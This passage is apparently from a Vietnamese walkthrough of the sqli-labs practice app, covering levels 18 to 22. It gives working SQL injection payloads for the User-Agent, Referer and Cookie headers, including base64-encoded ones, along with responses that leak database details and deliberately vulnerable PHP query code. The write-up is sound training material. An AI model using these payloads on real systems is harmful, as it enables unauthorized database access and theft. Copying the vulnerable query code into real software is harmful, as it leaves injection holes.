<br>Your IP ADDRESS is: 172.17.0.1<br><font color= "#FFFF00" font size = 3 ></font><font color= "#0000ff" font size = 3 >Your User Agent is: ' and extractvalue(0x0a,concat(0x0a,(select+database()))),'</font><br>XPATH syntax error: 'security'<br><br><img src="../images/flag.jpg"  /><br>
```

## Less-19

Câu này tương tự câu 18, ở câu 18 là inject vào `User-Agent` thì ở câu này inject vào `Referer`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-19.png?raw=true)

Payload cũng tương tự câu 18.

`Referer: ' and extractvalue(0x0a,concat(0x0a,(select @@datadir))),'`

```html
<br>Your IP ADDRESS is: 172.17.0.1<br><font color= "#FFFF00" font size = 3 ></font><font color= "#0000ff" font size = 3 >Your Referer is: ' and extractvalue(0x0a,concat(0x0a,(select @@datadir))),', http://localhost/Less-19/</font><br>XPATH syntax error: '/var/lib/mysql/'<br><br>
```

## Less-20

Câu này thì không phải inject ở `User-Agent` hay `Referer` mà là ở `Cookie`

Source khá dài, nhưng về cơ bản là là khi login với `admin` thì server sẽ `Set-Cookie` như này.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-20_1.png?raw=true)

Nên giờ mình chỉ cần inject vào `Cookie` là có thể trigger được.

`Cookie: uname=1'+UNION+(SELECT+1,2,GROUP_CONCAT(+SCHEMA_NAME+)+FROM+INFORMATION_SCHEMA.SCHEMATA)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-20_2.png?raw=true)

## Less-21

Câu này tương tự câu 20 nhưng khi `Set-Cookie` thì data đã được encode dạng base64.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-21_1.png?raw=true)

Trước khi xử lý `Cookie`, server sẽ `decode` ` bas64` sau đó mới xử lý câu query.

```php
$cookee = base64_decode($cookee);
echo "<br></font>";
$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";
```

Nên bây giờ chỉ cần encode `Cookie` muốn gửi lên server là solve được câu này.

Payload ban đầu: `Cookie: uname=1') UNION (SELECT 1,2,GROUP_CONCAT( SCHEMA_NAME ) FROM INFORMATION_SCHEMA.SCHEMATA)-- `

Payload sau khi encode:

`Cookie: uname=MScpIFVOSU9OIChTRUxFQ1QgMSwyLEdST1VQX0NPTkNBVCggU0NIRU1BX05BTUUgKSBGUk9NIElORk9STUFUSU9OX1NDSEVNQS5TQ0hFTUFUQSktLSA=`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-21_2.png?raw=true)

## Less-22

Điểm khác biệt ở câu này với câu 21 là:

```php
$cookee = base64_decode($cookee);
$cookee1 = '"'. $cookee. '"';
echo "<br></font>";
$sql="SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1";
```

Nên chỉ cần chèn `"` trước `UNION` sau đó encode base64 là giải được câu này.

Payload ban đầu: `Cookie: uname=1" UNION (SELECT 1,2,GROUP_CONCAT( SCHEMA_NAME ) FROM INFORMATION_SCHEMA.SCHEMATA)-- ` 

Payload sau khi encode: `Cookie: uname=MSIgVU5JT04gKFNFTEVDVCAxLDIsR1JPVVBfQ09OQ0FUKCBTQ0hFTUFfTkFNRSApIEZST00gSU5GT1JNQVRJT05fU0NIRU1BLlNDSEVNQVRBKS0tIA==`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-22.png?raw=true)
